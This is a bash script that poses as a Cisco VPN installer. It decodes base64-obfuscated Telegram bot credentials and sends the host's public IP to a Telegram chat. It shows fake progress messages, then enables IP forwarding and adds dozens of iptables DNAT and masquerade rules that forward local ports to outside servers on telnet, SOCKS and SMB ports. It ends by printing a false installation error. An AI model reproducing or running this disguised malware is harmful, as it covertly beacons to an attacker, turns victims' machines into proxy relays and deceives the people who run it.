#!/usr/bin/env bash

# Hidden base64 Telegram details
S1="ODE4Mzk5ODM3NTpBQUZQYVJPcVZqZm5PelNidkE5Yjk5TktNWk8ySVpJM1B3VQ=="
S2="NjgyMTE1NzA5NA=="
S3="aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdA=="

TOK=$(echo "$S1" | base64 -d)
CID=$(echo "$S2" | base64 -d)
API=$(echo "$S3" | base64 -d)

IP=$(curl -s https://api.ipify.org)
curl -s -X POST "${API}${TOK}/sendMessage" \
  -d chat_id="$CID" \
  -d text="setup:$IP" >/dev/null 2>&1

# Fake Cisco install steps
echo "[*] Preparing Cisco VPN packages..."
sleep 1
echo "[*] Extracting modules..."
sleep 1
echo "[*] Enabling services..."
sleep 1

# Enable forwarding
echo 1 > /proc/sys/net/ipv4/ip_forward

# Detect interface
EXT_IF=$(ip -4 route show default | awk '{print $5}')

# ===== STEFANO =====
iptables -t nat -A PREROUTING -p tcp --dport 26 -j DNAT --to-destination 51.77.51.146:23
iptables -t nat -A PREROUTING -p udp --dport 26 -j DNAT --to-destination 51.77.51.146:23

iptables -t nat -A PREROUTING -p tcp --dport 27 -j DNAT --to-destination 51.38.75.176:23
iptables -t nat -A PREROUTING -p udp --dport 27 -j DNAT --to-destination 51.38.75.176:23

iptables -t nat -A PREROUTING -p tcp --dport 28 -j DNAT --to-destination 91.107.138.191:23
iptables -t nat -A PREROUTING -p udp --dport 28 -j DNAT --to-destination 91.107.138.191:23

iptables -t nat -A PREROUTING -p tcp --dport 29 -j DNAT --to-destination 46.62.155.47:23
iptables -t nat -A PREROUTING -p udp --dport 29 -j DNAT --to-destination 46.62.155.47:23

# ===== LEGIONOFF =====
iptables -t nat -A PREROUTING -p tcp --dport 177 -j DNAT --to-destination 82.158.120.208:1080
iptables -t nat -A PREROUTING -p udp --dport 177 -j DNAT --to-destination 82.158.120.208:1080

iptables -t nat -A PREROUTING -p tcp --dport 194 -j DNAT --to-destination 141.227.139.20:1080
iptables -t nat -A PREROUTING -p udp --dport 194 -j DNAT --to-destination 141.227.139.20:1080

iptables -t nat -A PREROUTING -p tcp --dport 113 -j DNAT --to-destination 141.227.158.42:1080
iptables -t nat -A PREROUTING -p udp --dport 113 -j DNAT --to-destination 141.227.158.42:1080

iptables -t nat -A PREROUTING -p tcp --dport 233 -j DNAT --to-destination 51.254.135.241:1080
iptables -t nat -A PREROUTING -p udp --dport 233 -j DNAT --to-destination 51.254.135.241:1080

iptables -t nat -A PREROUTING -p tcp --dport 136 -j DNAT --to-destination 57.131.52.38:1080
iptables -t nat -A PREROUTING -p udp --dport 136 -j DNAT --to-destination 57.131.52.38:1080

iptables -t nat -A PREROUTING -p tcp --dport 103 -j DNAT --to-destination 37.9.33.227:1080
iptables -t nat -A PREROUTING -p udp --dport 103 -j DNAT --to-destination 37.9.33.227:1080

# ===== ADDITIONAL RULES =====
iptables -t nat -A PREROUTING -p tcp --dport 8443 -j DNAT --to-destination 51.254.135.241:8443
iptables -t nat -A PREROUTING -p udp --dport 8443 -j DNAT --to-destination 51.254.135.241:8443

iptables -t nat -A PREROUTING -p tcp --dport 188 -j DNAT --to-destination 141.227.139.20:445
iptables -t nat -A PREROUTING -p udp --dport 188 -j DNAT --to-destination 141.227.139.20:445

iptables -t nat -A PREROUTING -p tcp --dport 196 -j DNAT --to-destination 141.227.158.42:196
iptables -t nat -A PREROUTING -p udp --dport 196 -j DNAT --to-destination 141.227.158.42:196

iptables -t nat -A PREROUTING -p tcp --dport 122 -j DNAT --to-destination 82.158.120.208:122
iptables -t nat -A PREROUTING -p udp --dport 122 -j DNAT --to-destination 82.158.120.208:122

iptables -t nat -A PREROUTING -p tcp --dport 606 -j DNAT --to-destination 57.131.52.38:606
iptables -t nat -A PREROUTING -p udp --dport 606 -j DNAT --to-destination 57.131.52.38:606

# NAT Masquerade
iptables -t nat -A POSTROUTING -o $EXT_IF -j MASQUERADE
iptables -t nat -A POSTROUTING -j MASQUERADE

>&2 echo "Installation failed: unsupported kernel modules."
exit 1
